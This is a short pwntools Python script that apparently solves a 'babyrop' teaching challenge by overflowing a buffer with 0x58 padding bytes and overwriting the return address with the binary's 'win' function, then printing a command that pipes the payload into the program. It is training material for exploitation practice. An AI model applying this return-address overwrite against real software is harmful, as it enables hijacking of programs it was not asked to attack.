from pwn import *

e = ELF('./babyrop_level1_teaching1')

pay = b'A'*0x58
pay += p64(e.symbols['win'])

print(f'{str(pay)[2:-1]} | ./babyrop_level1_teaching1')